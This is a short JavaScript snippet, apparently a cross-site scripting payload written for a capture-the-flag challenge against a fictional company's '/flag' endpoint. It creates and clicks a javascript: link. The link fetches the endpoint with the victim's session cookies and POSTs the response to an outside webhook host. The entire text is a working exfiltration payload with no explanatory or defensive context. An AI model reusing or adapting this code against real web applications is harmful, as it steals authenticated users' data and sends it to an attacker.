var a=document.createElement('a');
a.href='javascript:fetch("https://api.netquocca.quoccacorp.com/flag",{credentials:"include"}).then(function(r){return r.text()}).then(function(t){fetch("https://bold-galaxy-05.webhook.cool/",{method:"POST",mode:"no-cors",body:t})})';
document.body.appendChild(a);
a.click();
